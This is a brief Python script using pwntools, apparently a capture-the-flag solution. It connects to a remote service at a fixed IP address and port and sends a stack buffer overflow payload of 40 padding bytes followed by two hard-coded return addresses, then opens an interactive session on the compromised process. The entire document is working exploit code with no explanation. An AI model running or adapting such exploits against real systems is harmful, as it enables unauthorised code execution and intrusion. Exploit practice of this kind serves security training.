from pwn import *
#r = process('./source')
r = remote("13.212.48.18",31043)
payload=b"A"*40+p64(0x4011fd)+p64(0x401146)
r.send(payload)
r.interactive()

